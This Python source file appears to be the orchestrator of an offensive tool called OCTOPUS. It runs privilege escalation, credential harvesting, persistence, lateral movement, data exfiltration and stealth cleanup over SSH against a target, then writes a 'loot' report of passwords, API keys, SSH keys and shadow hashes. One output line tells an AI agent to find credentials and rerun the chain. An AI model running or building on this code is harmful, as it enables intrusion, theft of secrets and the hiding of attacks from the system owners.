#!/usr/bin/env python3
"""
Kill chain orchestrator: runs all stages.
"""

import logging
import os

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from config import CFG, find_all_wordlists, find_wordlist
except ImportError:
    CFG = {}

    def find_wordlist(cat):
        return ""

    def find_all_wordlists(cat):
        return []


from typing import Any, Callable, Optional, Union

from core.credentials import (
    CredentialRef,
    call_credential_provider,
    credential_material_for_execution,
    get_all_credential_refs_for_target,
    get_best_credential_ref,
    is_credential_handle,
    resolve_credential_handle,
    sanitize_credential_text,
)
from core.killchain.cleanup import stealth_cleanup
from core.killchain.exfil import data_exfil
from core.killchain.exploitation import auto_exploit
from core.killchain.lateral import lateral_move
from core.killchain.persistence import plant_persistence
from core.killchain.policy import master_gate_message, stage_gate_message
from core.killchain.privesc import run_privesc
from core.killchain.ssh_helpers import _ssh_connect
from core.killchain.vuln_assess import vuln_assess

logger = logging.getLogger("octopus.killchain.orchestrator")

_CredentialInput = Union[CredentialRef, str]

# ANSI Colors
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RED = "\033[91m"
C_CYAN = "\033[96m"
C_GREY = "\033[90m"
C_BLUE = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET = "\033[0m"


# PARAMIKO SSH HELPERS (shared across stages)


def _resolve_killchain_credential(
    target: str,
    user: Optional[Union[str, CredentialRef]],
    password: Optional[_CredentialInput],
    credential: Optional[_CredentialInput],
    port: int,
) -> tuple[Optional[CredentialRef], str]:
    """Resolve only an opaque SSH credential reference from compatibility inputs."""

    selected = credential
    username_hint = ""

    if isinstance(user, CredentialRef) or is_credential_handle(user):
        if selected is not None or password is not None:
            return None, "[!] Ambiguous credential inputs are prohibited."
        selected = user
    else:
        username_hint = str(user or "").strip()
        if password is not None:
            if selected is not None:
                return None, "[!] Ambiguous credential inputs are prohibited."
            if isinstance(password, CredentialRef) or is_credential_handle(password):
                selected = password
            elif str(password):
                return None, "[!] Plaintext credential arguments are prohibited; use a credential:// handle."

    if selected is None:
        if username_hint:
            return None, "[!] A credential:// handle is required with an SSH username."
        return None, ""

    resolved = resolve_credential_handle(selected)
    if resolved is None:
        return None, "[!] Unknown credential handle."
    if resolved.service != "ssh" or resolved.target != target:
        return None, "[!] Credential handle scope mismatch."
    if username_hint and resolved.username != username_hint:
        return None, "[!] Credential handle username mismatch."
    if resolved.port and resolved.port != int(port):
        return None, "[!] Credential handle port mismatch."
    return resolved, ""


def _call_ssh_provider(
    provider: Callable[..., str],
    target: str,
    credential: CredentialRef,
    port: int,
) -> str:
    """Reveal a credential only for one immediate provider invocation."""

    return call_credential_provider(
        credential,
        lambda material: provider(
            target,
            material.username,
            material.password,
            port,
        ),
    )


def _connect_with_credential(
    target: str,
    credential: CredentialRef,
    port: int,
) -> tuple[Any, str]:
    """Reveal only while Paramiko establishes an authenticated session."""

    failure = ""
    with credential_material_for_execution(credential) as material:
        try:
            client, error = _ssh_connect(
                target,
                material.username,
                material.password,
                port,
            )
        except Exception as exc:
            failure = f"{type(exc).__name__}: {sanitize_credential_text(exc, material.password)}"
        else:
            return client, sanitize_credential_text(error or "", material.password)
    return None, failure or "SSH connection failed"


def _call_configured_ssh_stage(
    stage: str,
    provider: Callable[..., str],
    target: str,
    credential: CredentialRef,
    port: int,
) -> str:
    """Apply the named stage gate immediately before provider execution."""

    denial = stage_gate_message(stage)
    if denial:
        return denial
    return _call_ssh_provider(provider, target, credential, port)


def run_full_killchain(
    target: str,
    user: Optional[Union[str, CredentialRef]] = None,
    password: Optional[_CredentialInput] = None,
    recon_data: str = "",
    port: int = 22,
    *,
    credential: Optional[_CredentialInput] = None,
) -> str:
    """
    Run the complete kill chain in sequence.
    Re-authenticates after privilege escalation before later stages.
    Order: Privesc → Harvest → Persist → Lateral → Exfil → Cleanup (LAST!)
    """
    master_denial = master_gate_message()
    if master_denial:
        return master_denial

    selected_credential, credential_error = _resolve_killchain_credential(
        target,
        user,
        password,
        credential,
        port,
    )
    if credential_error:
        return credential_error

    print(f"\n  {C_RED}{'=' * 60}{C_RESET}")
    print(f"  {C_RED}  OCTOPUS FULL KILL CHAIN v8.1 -- {target}{C_RESET}")
    print(f"  {C_RED}{'=' * 60}{C_RESET}")

    full_output = ""

    # Stages 3-9 require SSH credentials
    if selected_credential is not None:
        selected_user = selected_credential.username
        effective_credential = selected_credential
        full_output += (
            f"[*] Credentials available ({selected_user}@{target}) -- running configured post-access stages.\n\n"
        )
        print(f"  {C_GREEN}[+] Credentials available -- applying named post-access stage policy{C_RESET}")

        # Privilege escalation owns its credential-harvest pass.  Keeping that
        # work inside one provider prevents the former duplicate harvest.
        privesc_output = _call_configured_ssh_stage(
            "privesc",
            run_privesc,
            target,
            selected_credential,
            port,
        )
        full_output += privesc_output

        # Re-authenticate as root after privilege escalation.
        if "ROOT ACCESS CONFIRMED" in privesc_output or "uid=0(root)" in privesc_output:
            re_authed = False

            # Method 1: Try root with known credentials from credential store
            try:
                root_credential = get_best_credential_ref(
                    target,
                    "ssh",
                    username="root",
                    prefer_privileged=True,
                    port=port,
                )
                if root_credential is not None:
                    test_client, _test_err = _connect_with_credential(
                        target,
                        root_credential,
                        port,
                    )
                    if test_client:
                        test_client.close()
                        effective_credential = root_credential
                        re_authed = True
                        print(f"  {C_GREEN}[+] RE-AUTHENTICATED as root (credential store){C_RESET}")
                        full_output += "\n[+] Re-authenticated as root for stages 4-9\n"
            except Exception as e:
                logger.debug(
                    "Root re-auth via credential store failed (%s)",
                    type(e).__name__,
                )

            if not re_authed:
                print(
                    f"  {C_YELLOW}[!] Root re-auth failed — continuing as "
                    f"{selected_user} (rootbash may be available){C_RESET}"
                )
                full_output += f"\n[!] Root re-auth failed. Continuing as {selected_user}.\n"
                full_output += "[!] Note: /tmp/.mtr/rootbash may be available for local root commands.\n"

        # Persistence
        full_output += "\n" + _call_configured_ssh_stage(
            "persistence",
            plant_persistence,
            target,
            effective_credential,
            port,
        )

        # Lateral movement
        full_output += "\n" + _call_configured_ssh_stage(
            "lateral_movement",
            lateral_move,
            target,
            effective_credential,
            port,
        )

        # Data exfiltration
        full_output += "\n" + _call_configured_ssh_stage(
            "data_exfil",
            data_exfil,
            target,
            effective_credential,
            port,
        )

        # Cleanup must always remain the final stage.
        full_output += "\n" + _call_configured_ssh_stage(
            "cleanup",
            stealth_cleanup,
            target,
            effective_credential,
            port,
        )
    else:
        # No creds — run full discovery pipeline
        vuln_denial = stage_gate_message("vuln_assess")
        full_output += vuln_denial or vuln_assess(target, recon_data)

        exploit_denial = stage_gate_message("exploitation")
        full_output += "\n" + (exploit_denial or auto_exploit(target, recon_data))

        full_output += "\n[!] No SSH credentials available -- credential-required stages skipped.\n"
        full_output += "AI: Find credentials first, then run killchain_full with its credential:// handle.\n"

    # Generate final report after all stages complete
    if selected_credential is not None:
        loot_base = os.path.expanduser("~/OCTOPUS/loot")
        loot_dir = os.path.join(loot_base, target.replace(".", "_"))
        os.makedirs(loot_dir, exist_ok=True)
        _generate_target_report(
            target,
            effective_credential.username,
            loot_dir,
            [],
            full_output,
        )

    return full_output


# STAGE 9: STEALTH CLEANUP


def _generate_target_report(host: str, user: str, loot_dir: str, exfil_files: list, full_output: str):
    """Generate a comprehensive target intelligence report.
    Saves to loot_dir/<IP>_report.txt with all discovered credentials,
    keys, tokens, services, and kill chain results."""
    import re as _re
    from datetime import datetime as _dt

    report_path = os.path.join(loot_dir, f"{host.replace('.', '_')}_report.txt")
    print(f"    {C_GREEN}[*] Generating target report: {report_path}{C_RESET}")

    lines = []
    lines.append(f"{'═' * 70}")
    lines.append("  OCTOPUS TARGET INTELLIGENCE REPORT")
    lines.append(f"  Target: {host}")
    lines.append(f"  Generated: {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"  Initial Access: {user}@{host}")
    lines.append(f"{'═' * 70}")
    lines.append("")

    # ── CREDENTIALS SECTION ────────────────────────────────────
    lines.append("[CREDENTIALS DISCOVERED]")
    lines.append("-" * 40)
    # From the reference-only credential cache. Secret references and plaintext
    # are deliberately excluded from the report.
    all_creds = get_all_credential_refs_for_target(host)
    for service, credential_refs in all_creds.items():
        for credential_ref in credential_refs:
            lines.append(
                f"  [{service}] {credential_ref.username} ({credential_ref.auth_kind}; {credential_ref.handle})"
            )

    # From output text
    database_secrets = list(
        _re.finditer(
            r'(?:DB_PASSWORD|DB_PASS|MYSQL_PASSWORD)\s*[=:]\s*[\'"]?([^\s\'"#;]{3,80})',
            full_output,
            _re.IGNORECASE,
        )
    )
    api_secrets = list(
        _re.finditer(
            r'(?:API_KEY|SECRET_KEY|APP_SECRET|JWT_SECRET)\s*[=:]\s*[\'"]?([^\s\'"#;]{8,120})',
            full_output,
            _re.IGNORECASE,
        )
    )
    if database_secrets:
        lines.append(f"  [database] {len(database_secrets)} secret value(s) observed; redacted")
    if api_secrets:
        lines.append(f"  [api_key] {len(api_secrets)} secret value(s) observed; redacted")
    lines.append("")

    # ── PRIVATE KEYS SECTION ──────────────────────────────────
    if "PRIVATE KEY" in full_output:
        lines.append("[SSH PRIVATE KEYS FOUND]")
        lines.append("-" * 40)
        for m in _re.finditer(r"SSH PRIVATE KEY found: (\S+)", full_output):
            lines.append(f"  Key: {m.group(1)}")
        lines.append("")

    # ── SHADOW HASHES ─────────────────────────────────────────
    if "shadow" in full_output.lower() and "$" in full_output:
        lines.append("[SHADOW HASHES]")
        lines.append("-" * 40)
        for m in _re.finditer(r"(\w+):\s*(\$[\dy]+\$[^\s:]+)", full_output):
            lines.append(f"  {m.group(1)}: {m.group(2)[:50]}...")
        lines.append("")

    # ── EXFILTRATED FILES ─────────────────────────────────────
    if exfil_files:
        lines.append("[EXFILTRATED FILES]")
        lines.append("-" * 40)
        for ef in exfil_files:
            lines.append(f"  {ef['remote']} → {ef['local']} ({ef['size']} bytes)")
        lines.append("")

    # ── NETWORK INFO ──────────────────────────────────────────
    lines.append("[NETWORK INFORMATION]")
    lines.append("-" * 40)
    for m in _re.finditer(r"Internal subnet: (\S+)", full_output):
        lines.append(f"  Subnet: {m.group(1)}")
    for m in _re.finditer(r"DISCOVERED INTERNAL HOSTS: (\d+)", full_output):
        lines.append(f"  Internal hosts found: {m.group(1)}")
    for m in _re.finditer(r"→ (\d+\.\d+\.\d+\.\d+)", full_output):
        lines.append(f"  Internal host: {m.group(1)}")
    lines.append("")

    # ── KILL CHAIN RESULTS ────────────────────────────────────
    lines.append("[KILL CHAIN RESULTS]")
    lines.append("-" * 40)
    stages = [
        ("Privilege Escalation", "PRIVILEGE ESCALATION"),
        ("Persistence", "Persistence methods planted"),
        ("Lateral Movement", "Hosts compromised"),
        ("Data Exfiltration", "Files exfiltrated"),
    ]
    for stage_name, marker in stages:
        if marker in full_output:
            m = _re.search(rf"{_re.escape(marker)}" + r"[:\s]*(\d+)", full_output)
            count = m.group(1) if m else "?"
            lines.append(f"  {stage_name}: {count}")
    lines.append("")
    lines.append(f"{'═' * 70}")
    lines.append(f"Report saved to: {report_path}")
    lines.append(f"Loot directory: {loot_dir}")

    # Write report
    try:
        with open(report_path, "w") as f:
            f.write("\n".join(lines))
        print(f"    {C_GREEN}[+] Target report saved: {report_path}{C_RESET}")
    except Exception as e:
        print(f"    {C_RED}[!] Failed to save report: {e}{C_RESET}")


# QUICK TEST

if __name__ == "__main__":
    target = input("Target IP: ").strip()
    credential_handle = input("SSH credential:// handle (or Enter to skip): ").strip()

    if credential_handle:
        print(run_full_killchain(target, credential=credential_handle))
    else:
        print(vuln_assess(target))
        print(auto_exploit(target))
